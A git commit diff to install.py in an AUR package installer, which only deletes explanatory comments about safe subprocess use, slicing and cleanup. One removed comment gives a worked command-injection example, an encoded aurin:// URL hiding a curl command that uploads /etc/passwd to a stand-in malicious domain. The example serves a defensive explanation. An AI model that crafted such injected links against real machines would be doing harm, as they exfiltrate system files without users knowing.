01440ef9f24d5e09dc086588763a28e2de959e21
Suleman <slmn95@rediffmail.com>
2022-02-01 11:02:21 +0530

    Update install.py

--- data/install.py
+++ data/install.py
@@ -20,13 +20,6 @@ def notify(icon: str, title: str, message: str):
     # If not, use the value computed by the script
     xdg_runtime_dir = os.environ.get("XDG_RUNTIME_DIR", f"/run/user/{os.getuid()}")
 
-    # The original script uses os.system in conjunction with untrusted/user input.
-    # NEVER, EVER EVER EVER DO THAT. This is how RCE vulnerabilities are made!
-    # A malicious user could compromise the machine by hiding commands in an invisible link element
-    # For example:
-    # aurin://%3B%20curl%20-d%20%40%2Fetc%2Fpasswd%20http%3A%2F%2Fmalicious_domain.example.com%3B%20
-    # In this case `; curl -d @/etc/passwd http://malicious_domain.example.com; ` is hidden in the URL
-    # This transparently uploads /etc/passwd to a malicious domain without the user's knowledge.
     subprocess.check_call(
         [
             "notify-send",
@@ -39,9 +32,6 @@ def notify(icon: str, title: str, message: str):
         }
     )
 
-
-# Bail out when an invalid number of arguments has been given, a program that fetches remote content
-# should never download remote resources that can change without the user's consent
 if len(sys.argv) < 1:
     error_out(f"Invalid number of arguments, you must provide a package name")
 
@@ -52,7 +42,6 @@ if not input_pkg_name.startswith(URL_PREFIX):
     error_out(f"Input URL {input_pkg_name} does not start with {URL_PREFIX}")
 
 # Use slicing to extract the package name.
-# The original script uses str.replace which might have some nasty side effects.
 pkg_name = input_pkg_name[len(URL_PREFIX):]
 
 # Deny certain characters to avoid path pollution that can enable path traversal and such.
@@ -64,9 +53,6 @@ for thing in ILLEGAL_PKG_NAME_CONTENTS:
 temp_dir.mkdir(parents=True, exist_ok=True)
 build_root = temp_dir / pkg_name
 
-# Use check_call instead of run. You do not want to continue running this script when the call
-# to `git clone` fails. `check_call` will throw `CalledProcessError` when the command given to it
-# fails
 subprocess.check_call([
     "git", "clone",
     f"https://aur.archlinux.org/{pkg_name}.git",
@@ -82,11 +68,8 @@ subprocess.check_call(
     cwd=build_root
 )
 
-# Make sure we're not in the directory that's about to be removed
 os.chdir(os.environ.get("HOME", "/"))
 
-# This was originally handled in installpkg.sh with `rm -rf "$1"`.
-# Just a warning that this can be an enormous footgun
 shutil.rmtree(build_root, ignore_errors=True)
 
 notify("/opt/aurin/aurin48.png", "Install Successful", f"{pkg_name} has been installed!")
